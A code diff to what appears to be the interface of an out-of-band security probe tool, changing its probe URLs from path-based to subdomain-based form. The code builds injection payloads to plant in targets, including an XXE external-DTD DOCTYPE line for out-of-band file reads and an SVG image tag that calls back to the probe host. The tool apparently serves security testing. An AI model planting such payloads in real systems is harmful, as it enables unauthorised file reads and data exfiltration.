@@ -35,7 +35,7 @@ const TARGETS: [string, string][] = [
 ];
 
 function templates(tag: string, host: string): Record<string, { label: string; contentType: string; body: string }> {
-  const back = `https://${host}/${tag}`;
+  const back = `https://${tag}-${host}`;
   return {
     "xxe-dtd": {
       label: "XXE: external DTD (out-of-band read)",
@@ -316,7 +316,7 @@ export function HttpRuleTab({ p }: { p: Probe }) {
             </Row>
             {draft.template && plantHint(draft.template, p.tag, host) && <Row label="Plant this">{plantHint(draft.template, p.tag, host)}</Row>}
             <Row label="Fetch URL" help="The file is served at any path under the probe, over HTTP and HTTPS.">
-              {[`http://${p.tag}.${host}/x`, `https://${host}/${p.tag}/x`].map((u) => <CopyLine key={u} text={u} what="fetch URL" />)}
+              {[`http://${p.tag}.${host}/x`, `https://${p.tag}-${host}/x`].map((u) => <CopyLine key={u} text={u} what="fetch URL" />)}
             </Row>
             <Row label="Content type" error={errFor("contentType")}><label className={cn(fld, bad("contentType"))}><input aria-label="Content type" spellCheck={false} value={draft.contentType ?? ""} className={inputCls} onChange={(e) => set({ contentType: e.target.value })} /></label></Row>
           </>
@@ -432,8 +432,8 @@ function CopyLine({ text, what }: { text: string; what: string }) {
 // what to put in the target so it fetches the hosted file
 function plantHint(template: string, tag: string, host: string) {
   if (template === "xxe-dtd") return <CopyLine text={`<!DOCTYPE x SYSTEM "http://${tag}.${host}/x.dtd">`} what="DOCTYPE line" />;
-  if (template === "svg") return <CopyLine text={`<img src="https://${host}/${tag}/x.svg">`} what="image tag" />;
-  if (template === "headless-page") return <CopyLine text={`https://${host}/${tag}/page.html`} what="page URL" />;
+  if (template === "svg") return <CopyLine text={`<img src="https://${tag}-${host}/x.svg">`} what="image tag" />;
+  if (template === "headless-page") return <CopyLine text={`https://${tag}-${host}/page.html`} what="page URL" />;
   return null;
 }
 
